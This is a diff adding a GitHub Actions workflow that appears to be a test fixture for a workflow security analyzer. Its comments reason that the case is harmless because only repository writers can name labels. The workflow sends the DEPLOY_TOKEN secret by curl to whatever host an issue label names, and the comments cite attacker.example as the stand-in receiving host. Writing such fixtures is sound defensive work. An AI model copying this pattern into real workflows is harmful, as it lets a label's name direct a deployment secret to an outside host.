@@ -1,0 +1,20 @@
+# situation: on issues labeled, a step sends a request with curl and the
+#   secret DEPLOY_TOKEN to the host the name of the label names.
+# reason: no harm: only those who can write to the repository name a label.
+# cause: the table of contexts reads the name of a label as a string an
+#   attacker writes freely.
+# attack: the attacker cannot name a label; one who can write to the
+#   repository names a label attacker.example.
+# attack-run-behavior: curl sends the request with the secret to
+#   attacker.example only when a writer names the label so.
+on: 
+  issues:
+    types: [labeled]
+jobs:
+  j:
+    runs-on: ubuntu-latest
+    env:
+      DEPLOY_TOKEN: ${{ secrets.DEPLOY_TOKEN }}
+    steps:
+      - run: |
+          curl -fsS -H "Authorization: Bearer $DEPLOY_TOKEN" "https://${{ github.event.label.name }}/status"
